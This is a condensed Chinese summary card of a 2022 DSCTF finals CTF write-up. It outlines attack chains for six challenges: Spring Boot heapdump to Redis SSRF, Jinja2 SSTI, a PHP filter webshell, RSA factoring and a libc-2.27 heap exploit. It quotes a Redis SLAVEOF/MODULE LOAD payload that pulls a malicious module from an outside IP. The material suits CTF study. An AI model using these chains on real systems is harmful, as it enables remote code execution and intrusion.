---
title: "2022 DSCTF 决赛 WP"
category: web
tags: ["2022 DSCTF 决赛", "web", "SpringBoot", "heapdump", "jodd-http", "redis-ssrf"]
signals: ["2022 DSCTF 决赛 2022", "SpringBoot", "heapdump", "jodd-http", "redis-ssrf", "SLAVEOF", "module-load", "nghttp", "h2", "ssrf", "rce", "ssti", "xss", "Spring"]
difficulty: hard
source: "https://www.ctfiot.com/51953.html"
tools: ["Java", "Jinja2", "PHP", "Spring"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 DSCTF 决赛 WP

> 赛事：2022 DSCTF 决赛 2022 | 方向：web | 难度：hard | 工具：Java、Jinja2、PHP、Spring

## 一句话总结

6 题综合：Spring Boot SSRF + Jinja2 SSTI + PHP iconv + RSA + libc-2.27 堆

## 攻击链

1. ezjava: 扫 /actuator/heapdump 拿 redis 密码 → jodd-http SSRF → redis SLAVEOF + MODULE LOAD 写 /tmp/exp.so 反弹
2. newweb: nghttp HTTP/2 → Jinja2 __class__.__base__.__subclasses__() 走 attr 取 __globals__[''__builtins__''].eval
3. safe_script: sessid=php://filter/convert.iconv.utf-7.utf-8 + 一句话木马 php://filter 链
4. Esc@pE_ASt_Reverge_d: Misc 隐写 / 还原
5. tomic: qsieve 分解 n → p+q；GCD(n,e) 求共享因子 p
6. gonote: libc-2.27 负 size 整数溢出 tcache 越界 → leak libc → __free_hook = system → /bin/sh

## 关键 payload

```
SLAVEOF 121.4.124.62 6666 / CONFIG SET dir /tmp / config set dbfilename exp.so / MODULE LOAD /tmp/exp.so
```

## 经验教训

Spring Boot heapdump + jodd-http SSRF 是 Java CTF 标配；Jinja2 attr 链是 WAF 绕过关键

## 标签

SpringBoot、heapdump、jodd-http、redis-ssrf、SLAVEOF、module-load、nghttp、h2、__base__-__subclasses__、iconv、php://filter、qsieve、GCD、libc-2.27、tcache、__free_hook、heap-overflow

## 参考来源

- https://www.ctfiot.com/51953.html
- 原文件：2022_DSCTF决赛wp.full.md
